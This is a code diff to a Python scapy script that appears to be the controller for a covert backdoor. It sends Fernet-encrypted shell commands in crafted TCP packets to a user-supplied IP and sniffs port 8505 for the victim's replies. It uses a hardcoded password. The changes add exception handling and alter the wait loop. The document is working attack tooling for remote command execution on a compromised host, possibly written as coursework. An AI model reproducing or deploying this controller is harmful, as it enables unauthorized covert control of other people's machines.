@@ -21,12 +21,18 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-
 def backdoor_packet_handler(pkt):
     global responded
+    print("Packet Received")
     if TCP in pkt and pkt[TCP].dport==8505:
-        print(decrypt(pkt.load, b"password"))
-        responded = 1
+        try:
+            print(decrypt(pkt.load, b"password"))
+            responded = 1
+            return True
+        except:
+            print("Can't decrypt the packet")
+            return False
+
 # ----------------------------------------------------------------------------------------------------------------------
 # The encrypt function takes in a message and encrypts using the Fernet encryption algorithm from the cryptography
 # package
@@ -79,10 +85,11 @@ def decrypt(cipherText, password):
     return encrypter.decrypt(cipherText)
 
 
-responded = 0
+
 dAddr = input("Enter Destination IP\n")
 srcPort = input("Enter Source Port\n")
 while 1:
+    responded = 0
     cmdLn = input("Enter command\n")
     ip = IP(dst=dAddr)
     ip.show()
@@ -90,8 +97,8 @@ while 1:
     tcp.show()
     encryptCommand = encrypt(b"COMMAND_START" + cmdLn.encode() + b"COMMAND_END", b"password")
     pack = (ip / tcp / encryptCommand)
-    rtPack = send(pack)
-    while responded == 0:
-        # Wait for the return of command sent
-        sniff(prn=backdoor_packet_handler, filter="tcp and dst port 8505", store=0, count=1)
+    send(pack)
+    sniff(prn=backdoor_packet_handler, filter="tcp and dst port 8505", store=0,count=1)
 
+
+exit()
